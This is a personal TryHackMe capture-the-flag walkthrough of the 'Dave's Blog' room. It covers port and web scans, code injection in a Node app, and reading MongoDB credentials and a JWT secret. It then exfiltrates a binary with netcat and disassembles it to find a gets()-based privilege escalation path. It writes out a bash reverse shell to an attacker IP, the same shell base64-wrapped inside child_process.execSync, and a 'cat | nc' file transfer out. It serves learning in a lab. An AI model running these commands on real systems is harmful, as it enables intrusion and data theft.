<h1 align="center">Dave´s Blog</h1>
<p align="center">2025, August 16<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>467</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>My friend Dave made his own blog!</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/9554f5a6-ef1d-4ce2-8ea4-beb861619ebe"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/davesblog">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/064d90e1-0704-47f7-a690-c74b4866d66cc"></p>


<br>
<br>

```bash
:~/DavesBlog# nikto -h xx.xxx.xx.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    ip-xx.xxx.xx.xxx.ec2.internal
+ Target Port:        80
+ Start Time:         2025-08-16 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/22e 0x8R1oIqXXVVXgZl/aE2f24LJICp0 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self'
+ Allowed HTTP Methods: GET, HEAD 
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2025-08-16 xx:xx:xx (GMT1) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


<br>
<br>


```bash
:~/DavesBlog# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xxx
...
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp   open   http         nginx 1.14.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Dave's Blog
3000/tcp open   http         Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Dave's Blog
8989/tcp closed sunwebadmins
```

<br>

```bash
:~/DavesBlog# dirsearch -u http://xx.xxx.xxx.xxx -t 100 -i 200,301
...
[xx:xx:xx] Starting: 
[xx:xx:xx] 200 -    1KB - /ADMIN
[xx:xx:xx] 200 -    1KB - /Admin
[xx:xx:xx] 200 -    1KB - /admin
[xx:xx:xx] 200 -    1KB - /Admin/
[xx:xx:xx] 200 -    1KB - /admin/
[xx:xx:xx] 301 -  179B  - /images  ->  /images/
[xx:xx:xx] 200 -   31B  - /robots.txt
```

<br>


```bash
:~/DavesBlog# curl http://xx.xxx.xx.xxx/robots.txt
User-Agent: *
Disallow: /admin
```

<br>

```bash
:~/DavesBlog# curl http://xx.xxx.xx.xxx/admin
<!DOCTYPE html>
<html>

<head>
  <title>Login | Dave's Blog</title>
  <link rel='stylesheet' href='/stylesheets/style.css' />
</head>

<body>
  <h1>Login</h1>

  <form method="POST">
    <input type="text" name="username" placeholder="username" /> <br />
    <input type="password" name="password" placeholder="password" /> <br />
    <input type="submit" value="Log in" />
  </form>

  Don't have an account? Click <a href="/admin/register">here</a> to register!

  <script>
    if(document.location.hash) {
      const div = document.createElement('div')
      div.innerText = decodeURIComponent(document.location.hash.substr(1));
      div.className = 'note';
      document.body.insertBefore(div, document.body.firstChild);
    }
    document.querySelector('form').onsubmit = (e) => {
      /*e.preventDefault();
      const username = document.querySelector('input[type=text]').value;
      const password = document.querySelector('input[type=password]').value;

      fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({username, password})
      }).then(() => {
        location.reload();
      })
      return false;*/
    }
  </script>
</body>

</html>
```

<br>

<img width="1130" height="401" alt="image" src="https://github.com/user-attachments/assets/447b63e9-e4a2-4608-a9e9-f6cfff230f5b" />

<br>

<img width="1112" height="265" alt="image" src="https://github.com/user-attachments/assets/0bbb3e1d-cbf3-4557-8ada-3976ddc536c0" />

<br>

<img width="1130" height="365" alt="image" src="https://github.com/user-attachments/assets/463f7a41-f106-4a08-976d-747938da55a2" />

<br>

<img width="1122" height="571" alt="image" src="https://github.com/user-attachments/assets/42beb6ff-96e5-45c1-b3ce-dcd77f53bce0" />

<br>

<img width="1218" height="336" alt="image" src="https://github.com/user-attachments/assets/3b7810c9-b00c-4f78-bcd5-d10a65a3d5bf" />

<br>

<img width="1212" height="391" alt="image" src="https://github.com/user-attachments/assets/ce7b90e0-dfb8-40df-9e47-469a7428b6e5" />


<br>

<img width="1125" height="434" alt="image" src="https://github.com/user-attachments/assets/ba0872ba-75a4-432f-8058-3c707e0daf4d" />

<br>

<img width="1217" height="485" alt="image" src="https://github.com/user-attachments/assets/4b89d70d-313f-4a15-9a4a-c8f2b9b7089b" />

<br>
<br>

<img width="1215" height="496" alt="image" src="https://github.com/user-attachments/assets/61ff8e7a-f5c9-4bbb-9919-b801e90b82ed" />

<br>

<img width="1217" height="491" alt="image" src="https://github.com/user-attachments/assets/4b7c1b03-4198-460e-8b04-9bfb0e86cd0b" />

<br>

<img width="1119" height="459" alt="image" src="https://github.com/user-attachments/assets/69b8820a-c804-4195-8e41-12cc1c5f229a" />

<br>

<img width="814" height="254" alt="image" src="https://github.com/user-attachments/assets/20a1f7e2-74c5-47d3-857e-67a3af4c1ff3" />

<br>

<img width="1108" height="482" alt="image" src="https://github.com/user-attachments/assets/856c5ead-6b27-4b44-8dd6-062a3e8348fe" />

<br>

```bash
bash -i >& /dev/tcp/xx.xxx.xx.x/4444 0>&1
```
<br>

```bash
YmFzaCAtaSA+JiA************xMC4yMDEuMjMuNS80NDQ0IDA+JjE=
```
<br>

```bash
require('child_process').execSync('echo YmFzaCAtaSA+JiA************xMC4yMDEuMjMuNS80NDQ0IDA+JjE= | base64 -d | bash').toString();
```
<br>
<br>

<img width="1200" height="674" alt="image" src="https://github.com/user-attachments/assets/77b68af1-5cd9-4083-a097-1be4ad8b5156" />


<br>
<br>

```bash
:~/DavesBlog# nc -nlvp 4444
...
dave@daves-blog:~/blog$ ls -la /home/dave
ls -la /home/dave
total 44
drwxr-xr-x  5 dave dave 4096 May 22  2020 .
drwxr-xr-x  3 root root 4096 May 21  2020 ..
lrwxrwxrwx  1 dave dave    9 May 21  2020 .bash_history -> /dev/null
-rw-r--r--  1 dave dave  220 May 21  2020 .bash_logout
-rw-r--r--  1 dave dave 3771 May 21  2020 .bashrc
drwxr-xr-x  9 dave dave 4096 Aug 16 03:08 blog
drwxrwxr-x  3 dave dave 4096 May 21  2020 .local
drwxrwxr-x 94 dave dave 4096 May 21  2020 .npm
-rw-r--r--  1 dave dave  807 May 21  2020 .profile
-rw-rw-r--  1 dave dave   66 May 21  2020 .selected_editor
-rwxr-xr-x  1 root root  137 May 22  2020 startup.sh
-rw-rw-r--  1 dave dave   38 May 21  2020 user.txt
dave@daves-blog:~/blog$ cat user.txt
cat user.txt
cat: user.txt: No such file or directory
dave@daves-blog:~/blog$ cat /home/dave/user.txt
cat /home/dave/user.txt
THM{************5367fdcfa4741bebb88a}
```

<br>
<br>
<h3>/uid_checker</h3>

```bash
dave@daves-blog:~$ cat startup.sh
cat startup.sh
# tcpserver -t 50 -RHl0 0.0.0.0 8989 /uid_checker &
rm ~/blog/settings.json;
while :; do cd ~/blog/; npm i; node bin/www; sleep 5; done;
```

<br>

```bash
dave@daves-blog:~/blog$ ls -lah
ls -lah
total 76K
drwxr-xr-x  9 dave dave 4.0K Aug 16 03:08 .
drwxr-xr-x  5 dave dave 4.0K May 22  2020 ..
-rw-r--r--  1 dave dave 1.3K May 21  2020 app.js
drwxr-xr-x  2 dave dave 4.0K May 21  2020 bin
drwxr-xr-x  2 dave dave 4.0K May 21  2020 helpers
drwxr-xr-x  2 dave dave 4.0K May 21  2020 models
drwxrwxr-x 93 dave dave 4.0K Aug 16 03:08 node_modules
-rw-r--r--  1 dave dave  347 May 21  2020 package.json
drwxr-xr-x  5 dave dave 4.0K May 21  2020 public
drwxr-xr-x  2 dave dave 4.0K May 22  2020 routes
-rw-rw-r--  1 dave dave   46 Aug 16 03:08 settings.json
drwxr-xr-x  2 dave dave 4.0K May 21  2020 views
-rw-r--r--  1 dave dave  27K May 21  2020 yarn.lock
```

<br>
<br>
<h3>settings.json</h3>

```bash
dave@daves-blog:~/blog$ cat settings.json
cat settings.json
{
  "jwtToken": "0.*****e7d3ar0.6mlyymbg0e9"
}
```

<br>
<br>
<h3>app.js</h3>
<p>
  
- mongodb://localhost:27017/daves-blog</p>

```bash
dave@daves-blog:~/blog$ cat app.js
cat app.js
var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
const mongoose = require('mongoose');

var indexRouter = require('./routes/index');
var adminRouter = require('./routes/admin');

var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

mongoose.connect('mongodb://localhost:27017/daves-blog', {
  useNewUrlParser: true
});

console.log(require('./helpers/getJwtSecret')())

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.use('/', indexRouter);
app.use('/admin', adminRouter);

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

module.exports = app;
```

<br>


```bash
dave@daves-blog:~/blog$ mongo
mongo
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27017
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
...
> show databases
shshow databases
admin       0.000GB
config      0.000GB
daves-blog  0.000GB
local       0.000GB
> use daves-blog
ususe daves-blog
switched to db daves-blog
> show tables;
shshow tables;
posts
users
whatcouldthisbes
> db.users.find()
dbdb.users.find()
{ "_id" : ObjectId("5ec6e5cf1dc4d364bf864107"), "isAdmin" : true, "username" : "dave", "password" : "THM{***********************}", "__v" : 0 }
> db.whatcouldthisbes.find()
dbdb.whatcouldthisbes.find()
{ "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"), "whatCouldThisBe" : "THM{********************************}", "__v" : 0 }
```

<br>

```bash
> db.whatcouldthisbes.find().pretty()
dbdb.whatcouldthisbes.find().pretty()
{
	"_id" : ObjectId("5ec6e5cf1dc4d364bf864108"),
	"whatCouldThisBe" : "THM{********************************}",
	"__v" : 0
}
```


<br>
<br>
<h3>Dave´s Privileges</h3>

```bash
dave@daves-blog:~/blog$ sudo -l
sudo -l
Matching Defaults entries for dave on daves-blog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on daves-blog:
    (root) NOPASSWD: /uid_checker
```

<br>

```bash
dave@daves-blog:/$ ls -lah
ls -lah
total 2.0G
drwxr-xr-x  24 root root 4.0K May 21  2020 .
drwxr-xr-x  24 root root 4.0K May 21  2020 ..
drwxr-xr-x   2 root root 4.0K May 21  2020 bin
drwxr-xr-x   3 root root 4.0K May 21  2020 boot
drwxr-xr-x   2 root root 4.0K May 21  2020 cdrom
drwxr-xr-x  15 root root 3.7K Aug 16 03:08 dev
drwxr-xr-x  96 root root 4.0K May 23  2020 etc
drwxr-xr-x   3 root root 4.0K May 21  2020 home
lrwxrwxrwx   1 root root   34 May 21  2020 initrd.img -> boot/initrd.img-4.15.0-101-generic
lrwxrwxrwx   1 root root   34 May 21  2020 initrd.img.old -> boot/initrd.img-4.15.0-101-generic
drwxr-xr-x  22 root root 4.0K May 21  2020 lib
drwxr-xr-x   2 root root 4.0K Aug  5  2019 lib64
drwx------   2 root root  16K May 21  2020 lost+found
drwxr-xr-x   2 root root 4.0K Aug  5  2019 media
drwxr-xr-x   2 root root 4.0K Aug  5  2019 mnt
drwxr-xr-x   2 root root 4.0K Aug  5  2019 opt
dr-xr-xr-x 109 root root    0 Aug 16 03:08 proc
drwx------   6 root root 4.0K May 22  2020 root
drwxr-xr-x  26 root root  900 Aug 16 03:09 run
drwxr-xr-x   2 root root  12K May 21  2020 sbin
drwxr-xr-x   4 root root 4.0K May 21  2020 snap
drwxr-xr-x   2 root root 4.0K Aug  5  2019 srv
-rw-------   1 root root 2.0G May 21  2020 swap.img
dr-xr-xr-x  13 root root    0 Aug 16 04:31 sys
drwxrwxrwt   9 root root 4.0K Aug 16 03:09 tmp
-rwxr-xr-x   1 root root 8.4K May 21  2020 uid_checker
drwxr-xr-x  10 root root 4.0K Aug  5  2019 usr
drwxr-xr-x  14 root root 4.0K May 21  2020 var
lrwxrwxrwx   1 root root   31 May 21  2020 vmlinuz -> boot/vmlinuz-4.15.0-101-generic
lrwxrwxrwx   1 root root   31 May 21  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-101-generic
```

<br>
<br>
<h3>uid_checker´s strings</h3>


```bash
dave@daves-blog:/$ strings uid_checker
...
How did you get here???
/bin/sh
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
Your UID is: %d
Your GID is: %d
THM{*******************************}
Wow! You found the secret function! I still need to finish it..
Invalid choice
```

<img width="1200" height="522" alt="image" src="https://github.com/user-attachments/assets/620ff899-be0a-4e01-abee-49829a836b10" />

<br>

```bash
dave@daves-blog:/$ ./uid_checker  
./uid_checker
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
1
1
Your UID is: 1000
dave@daves-blog:/$ ./uid_checker
./uid_checker
Welcome to the UID checker!
Enter 1 to check your UID or enter 2 to check your GID
2
2
Your GID is: 1000
dave@daves-blog:/$ 
```

<br>
<br>
<br>

```bash
dave@daves-blog:/$ objdump -d uid_checker

uid_checker:     file format elf64-x86-64


Disassembly of section .init:

0000000000400520 <_init>:
  400520:	48 83 ec 08          	sub    $0x8,%rsp
  400524:	48 8b 05 cd 0a 20 00 	mov    0x200acd(%rip),%rax        # 600ff8 <__gmon_start__>
  40052b:	48 85 c0             	test   %rax,%rax
  40052e:	74 02                	je     400532 <_init+0x12>
  400530:	ff d0                	callq  *%rax
  400532:	48 83 c4 08          	add    $0x8,%rsp
  400536:	c3                   	retq   

Disassembly of section .plt:

0000000000400540 <.plt>:
  400540:	ff 35 c2 0a 20 00    	pushq  0x200ac2(%rip)        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400546:	ff 25 c4 0a 20 00    	jmpq   *0x200ac4(%rip)        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40054c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400550 <puts@plt>:
  400550:	ff 25 c2 0a 20 00    	jmpq   *0x200ac2(%rip)        # 601018 <puts@GLIBC_2.2.5>
  400556:	68 00 00 00 00       	pushq  $0x0
  40055b:	e9 e0 ff ff ff       	jmpq   400540 <.plt>

0000000000400560 <getuid@plt>:
  400560:	ff 25 ba 0a 20 00    	jmpq   *0x200aba(%rip)        # 601020 <getuid@GLIBC_2.2.5>
  400566:	68 01 00 00 00       	pushq  $0x1
  40056b:	e9 d0 ff ff ff       	jmpq   400540 <.plt>

0000000000400570 <system@plt>:
  400570:	ff 25 b2 0a 20 00    	jmpq   *0x200ab2(%rip)        # 601028 <system@GLIBC_2.2.5>
  400576:	68 02 00 00 00       	pushq  $0x2
  40057b:	e9 c0 ff ff ff       	jmpq   400540 <.plt>

0000000000400580 <printf@plt>:
  400580:	ff 25 aa 0a 20 00    	jmpq   *0x200aaa(%rip)        # 601030 <printf@GLIBC_2.2.5>
  400586:	68 03 00 00 00       	pushq  $0x3
  40058b:	e9 b0 ff ff ff       	jmpq   400540 <.plt>

0000000000400590 <strcmp@plt>:
  400590:	ff 25 a2 0a 20 00    	jmpq   *0x200aa2(%rip)        # 601038 <strcmp@GLIBC_2.2.5>
  400596:	68 04 00 00 00       	pushq  $0x4
  40059b:	e9 a0 ff ff ff       	jmpq   400540 <.plt>

00000000004005a0 <getgid@plt>:
  4005a0:	ff 25 9a 0a 20 00    	jmpq   *0x200a9a(%rip)        # 601040 <getgid@GLIBC_2.2.5>
  4005a6:	68 05 00 00 00       	pushq  $0x5
  4005ab:	e9 90 ff ff ff       	jmpq   400540 <.plt>

00000000004005a0 <getgid@plt>:
  4005a0:	ff 25 9a 0a 20 00    	jmpq   *0x200a9a(%rip)        # 601040 <getgid@GLIBC_2.2.5>
  4005a6:	68 05 00 00 00       	pushq  $0x5
  4005ab:	e9 90 ff ff ff       	jmpq   400540 <.plt>

00000000004005b0 <gets@plt>:
  4005b0:	ff 25 92 0a 20 00    	jmpq   *0x200a92(%rip)        # 601048 <gets@GLIBC_2.2.5>
  4005b6:	68 06 00 00 00       	pushq  $0x6
  4005bb:	e9 80 ff ff ff       	jmpq   400540 <.plt>

Disassembly of section .text:

00000000004005c0 <_start>:
  4005c0:	31 ed                	xor    %ebp,%ebp
  4005c2:	49 89 d1             	mov    %rdx,%r9
  4005c5:	5e                   	pop    %rsi
  4005c6:	48 89 e2             	mov    %rsp,%rdx
  4005c9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  4005cd:	50                   	push   %rax
  4005ce:	54                   	push   %rsp
  4005cf:	49 c7 c0 10 08 40 00 	mov    $0x400810,%r8
  4005d6:	48 c7 c1 a0 07 40 00 	mov    $0x4007a0,%rcx
  4005dd:	48 c7 c7 c6 06 40 00 	mov    $0x4006c6,%rdi
  4005e4:	ff 15 06 0a 20 00    	callq  *0x200a06(%rip)        # 600ff0 <__libc_start_main@GLIBC_2.2.5>
  4005ea:	f4                   	hlt    
  4005eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000004005f0 <_dl_relocate_static_pie>:
  4005f0:	f3 c3                	repz retq 
  4005f2:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  4005f9:	00 00 00 
  4005fc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400600 <deregister_tm_clones>:
  400600:	55                   	push   %rbp
  400601:	b8 60 10 60 00       	mov    $0x601060,%eax
  400606:	48 3d 60 10 60 00    	cmp    $0x601060,%rax
  40060c:	48 89 e5             	mov    %rsp,%rbp
  40060f:	74 17                	je     400628 <deregister_tm_clones+0x28>
  400611:	b8 00 00 00 00       	mov    $0x0,%eax
  400616:	48 85 c0             	test   %rax,%rax
  400619:	74 0d                	je     400628 <deregister_tm_clones+0x28>
  40061b:	5d                   	pop    %rbp
  40061c:	bf 60 10 60 00       	mov    $0x601060,%edi
  400621:	ff e0                	jmpq   *%rax
  400623:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  400628:	5d                   	pop    %rbp
  400629:	c3                   	retq   
  40062a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400630 <register_tm_clones>:
  400630:	be 60 10 60 00       	mov    $0x601060,%esi
  400635:	55                   	push   %rbp
  400636:	48 81 ee 60 10 60 00 	sub    $0x601060,%rsi
  40063d:	48 89 e5             	mov    %rsp,%rbp
  400640:	48 c1 fe 03          	sar    $0x3,%rsi
  400644:	48 89 f0             	mov    %rsi,%rax
  400647:	48 c1 e8 3f          	shr    $0x3f,%rax
  40064b:	48 01 c6             	add    %rax,%rsi
  40064e:	48 d1 fe             	sar    %rsi
  400651:	74 15                	je     400668 <register_tm_clones+0x38>
  400653:	b8 00 00 00 00       	mov    $0x0,%eax
  400658:	48 85 c0             	test   %rax,%rax
  40065b:	74 0b                	je     400668 <register_tm_clones+0x38>
  40065d:	5d                   	pop    %rbp
  40065e:	bf 60 10 60 00       	mov    $0x601060,%edi
  400663:	ff e0                	jmpq   *%rax
  400665:	0f 1f 00             	nopl   (%rax)
  400668:	5d                   	pop    %rbp
  400669:	c3                   	retq   
  40066a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400670 <__do_global_dtors_aux>:
  400670:	80 3d e9 09 20 00 00 	cmpb   $0x0,0x2009e9(%rip)        # 601060 <__TMC_END__>
  400677:	75 17                	jne    400690 <__do_global_dtors_aux+0x20>
  400679:	55                   	push   %rbp
  40067a:	48 89 e5             	mov    %rsp,%rbp
  40067d:	e8 7e ff ff ff       	callq  400600 <deregister_tm_clones>
  400682:	c6 05 d7 09 20 00 01 	movb   $0x1,0x2009d7(%rip)        # 601060 <__TMC_END__>
  400689:	5d                   	pop    %rbp
  40068a:	c3                   	retq   
  40068b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  400690:	f3 c3                	repz retq 
  400692:	0f 1f 40 00          	nopl   0x0(%rax)
  400696:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40069d:	00 00 00 

00000000004006a0 <frame_dummy>:
  4006a0:	55                   	push   %rbp
  4006a1:	48 89 e5             	mov    %rsp,%rbp
  4006a4:	5d                   	pop    %rbp
  4006a5:	eb 89                	jmp    400630 <register_tm_clones>

00000000004006a7 <secret>:
  4006a7:	55                   	push   %rbp
  4006a8:	48 89 e5             	mov    %rsp,%rbp
  4006ab:	48 8d 3d 76 01 00 00 	lea    0x176(%rip),%rdi        # 400828 <_IO_stdin_used+0x8>
  4006b2:	e8 99 fe ff ff       	callq  400550 <puts@plt>
  4006b7:	48 8d 3d 82 01 00 00 	lea    0x182(%rip),%rdi        # 400840 <_IO_stdin_used+0x20>
  4006be:	e8 ad fe ff ff       	callq  400570 <system@plt>
  4006c3:	90                   	nop
  4006c4:	5d                   	pop    %rbp
  4006c5:	c3                   	retq   

00000000004006c6 <main>:
  4006c6:	55                   	push   %rbp
  4006c7:	48 89 e5             	mov    %rsp,%rbp
  4006ca:	48 83 ec 60          	sub    $0x60,%rsp
  4006ce:	89 7d ac             	mov    %edi,-0x54(%rbp)
  4006d1:	48 89 75 a0          	mov    %rsi,-0x60(%rbp)
  4006d5:	48 8d 3d 6c 01 00 00 	lea    0x16c(%rip),%rdi        # 400848 <_IO_stdin_used+0x28>
  4006dc:	e8 6f fe ff ff       	callq  400550 <puts@plt>
  4006e1:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  4006e5:	48 89 c7             	mov    %rax,%rdi
  4006e8:	b8 00 00 00 00       	mov    $0x0,%eax
  4006ed:	e8 be fe ff ff       	callq  4005b0 <gets@plt>
  4006f2:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  4006f6:	48 8d 35 9e 01 00 00 	lea    0x19e(%rip),%rsi        # 40089b <_IO_stdin_used+0x7b>
  4006fd:	48 89 c7             	mov    %rax,%rdi
  400700:	e8 8b fe ff ff       	callq  400590 <strcmp@plt>
  400705:	85 c0                	test   %eax,%eax
  400707:	75 25                	jne    40072e <main+0x68>
  400709:	b8 00 00 00 00       	mov    $0x0,%eax
  40070e:	e8 4d fe ff ff       	callq  400560 <getuid@plt>
  400713:	89 45 f8             	mov    %eax,-0x8(%rbp)
  400716:	8b 45 f8             	mov    -0x8(%rbp),%eax
  400719:	89 c6                	mov    %eax,%esi
  40071b:	48 8d 3d 7b 01 00 00 	lea    0x17b(%rip),%rdi        # 40089d <_IO_stdin_used+0x7d>
  400722:	b8 00 00 00 00       	mov    $0x0,%eax
  400727:	e8 54 fe ff ff       	callq  400580 <printf@plt>
  40072c:	eb 6e                	jmp    40079c <main+0xd6>
  40072e:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  400732:	48 8d 35 75 01 00 00 	lea    0x175(%rip),%rsi        # 4008ae <_IO_stdin_used+0x8e>
  400739:	48 89 c7             	mov    %rax,%rdi
  40073c:	e8 4f fe ff ff       	callq  400590 <strcmp@plt>
  400741:	85 c0                	test   %eax,%eax
  400743:	75 25                	jne    40076a <main+0xa4>
  400745:	b8 00 00 00 00       	mov    $0x0,%eax
  40074a:	e8 51 fe ff ff       	callq  4005a0 <getgid@plt>
  40074f:	89 45 fc             	mov    %eax,-0x4(%rbp)
  400752:	8b 45 fc             	mov    -0x4(%rbp),%eax
  400755:	89 c6                	mov    %eax,%esi
  400757:	48 8d 3d 52 01 00 00 	lea    0x152(%rip),%rdi        # 4008b0 <_IO_stdin_used+0x90>
  40075e:	b8 00 00 00 00       	mov    $0x0,%eax
  400763:	e8 18 fe ff ff       	callq  400580 <printf@plt>
  400768:	eb 32                	jmp    40079c <main+0xd6>
  40076a:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  40076e:	48 8d 35 53 01 00 00 	lea    0x153(%rip),%rsi        # 4008c8 <_IO_stdin_used+0xa8>
  400775:	48 89 c7             	mov    %rax,%rdi
  400778:	e8 13 fe ff ff       	callq  400590 <strcmp@plt>
  40077d:	85 c0                	test   %eax,%eax
  40077f:	75 0e                	jne    40078f <main+0xc9>
  400781:	48 8d 3d 68 01 00 00 	lea    0x168(%rip),%rdi        # 4008f0 <_IO_stdin_used+0xd0>
  400788:	e8 c3 fd ff ff       	callq  400550 <puts@plt>
  40078d:	eb 0d                	jmp    40079c <main+0xd6>
  40078f:	48 8d 3d 9a 01 00 00 	lea    0x19a(%rip),%rdi        # 400930 <_IO_stdin_used+0x110>
  400796:	e8 b5 fd ff ff       	callq  400550 <puts@plt>
  40079b:	90                   	nop
  40079c:	c9                   	leaveq 
  40079d:	c3                   	retq   
  40079e:	66 90                	xchg   %ax,%ax

00000000004007a0 <__libc_csu_init>:
  4007a0:	41 57                	push   %r15
  4007a2:	41 56                	push   %r14
  4007a4:	49 89 d7             	mov    %rdx,%r15
  4007a7:	41 55                	push   %r13
  4007a9:	41 54                	push   %r12
  4007ab:	4c 8d 25 5e 06 20 00 	lea    0x20065e(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
  4007b2:	55                   	push   %rbp
  4007b3:	48 8d 2d 5e 06 20 00 	lea    0x20065e(%rip),%rbp        # 600e18 <__init_array_end>
  4007ba:	53                   	push   %rbx
  4007bb:	41 89 fd             	mov    %edi,%r13d
  4007be:	49 89 f6             	mov    %rsi,%r14
  4007c1:	4c 29 e5             	sub    %r12,%rbp
  4007c4:	48 83 ec 08          	sub    $0x8,%rsp
  4007c8:	48 c1 fd 03          	sar    $0x3,%rbp
  4007cc:	e8 4f fd ff ff       	callq  400520 <_init>
  4007d1:	48 85 ed             	test   %rbp,%rbp
  4007d4:	74 20                	je     4007f6 <__libc_csu_init+0x56>
  4007d6:	31 db                	xor    %ebx,%ebx
  4007d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4007df:	00 
  4007e0:	4c 89 fa             	mov    %r15,%rdx
  4007e3:	4c 89 f6             	mov    %r14,%rsi
  4007e6:	44 89 ef             	mov    %r13d,%edi
  4007e9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  4007ed:	48 83 c3 01          	add    $0x1,%rbx
  4007f1:	48 39 dd             	cmp    %rbx,%rbp
  4007f4:	75 ea                	jne    4007e0 <__libc_csu_init+0x40>
  4007f6:	48 83 c4 08          	add    $0x8,%rsp
  4007fa:	5b                   	pop    %rbx
  4007fb:	5d                   	pop    %rbp
  4007fc:	41 5c                	pop    %r12
  4007fe:	41 5d                	pop    %r13
  400800:	41 5e                	pop    %r14
  400802:	41 5f                	pop    %r15
  400804:	c3                   	retq   
  400805:	90                   	nop
  400806:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40080d:	00 00 00 

0000000000400810 <__libc_csu_fini>:
  400810:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000400814 <_fini>:
  400814:	48 83 ec 08          	sub    $0x8,%rsp
  400818:	48 83 c4 08          	add    $0x8,%rsp
  40081c:	c3                   	retq   
```

<br>

```bash
00000000004006a7 <secret>:
  4006a7:	55                   	push   %rbp
  4006a8:	48 89 e5             	mov    %rsp,%rbp
  4006ab:	48 8d 3d 76 01 00 00 	lea    0x176(%rip),%rdi        # 400828 <_IO_stdin_used+0x8>
  4006b2:	e8 99 fe ff ff       	callq  400550 <puts@plt>
  4006b7:	48 8d 3d 82 01 00 00 	lea    0x182(%rip),%rdi        # 400840 <_IO_stdin_used+0x20>
  4006be:	e8 ad fe ff ff       	callq  400570 <system@plt>
  4006c3:	90                   	nop
  4006c4:	5d                   	pop    %rbp
  4006c5:	c3                   	retq   
```

<br>

```bash
:~/DavesBlog# nc -nlvp 8888 > crazybinary
Listening on 0.0.0.0 8888
```

<br>

```bash
dave@daves-blog:~/blog$ file /uid_checker
/uid_checker: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.
2.0, BuildID[sha1]=c4ddac4d961327c9e42f962ef94e45d2eb149c20, not stripped
```

<br>

```bash
dave@daves-blog:~/blog$ cp /uid_checker uid_checker
```

<br>

```bash
dave@daves-blog:~/blog$ ls
app.js  helpers  node_modules  public  settings.json  views
bin     models   package.json  routes  uid_checker    yarn.lock
```

```bash
dave@daves-blog:~/blog$ cat uid_checker | nc xx.xxx.xxx.xxx 8888
```

<br>

```bash
:~/DavesBlog# nc -nlvp 8888 > crazybinary
Listening on 0.0.0.0 8888
Connection received on xx.xxx.xx.xxx 47482
```


<br>

```bash
:~/DavesBlog# objdump -d crazybinary

crazybinary:     file format elf64-x86-64


Disassembly of section .init:

0000000000400520 <_init>:
  400520:	48 83 ec 08          	sub    $0x8,%rsp
  400524:	48 8b 05 cd 0a 20 00 	mov    0x200acd(%rip),%rax        # 600ff8 <__gmon_start__>
  40052b:	48 85 c0             	test   %rax,%rax
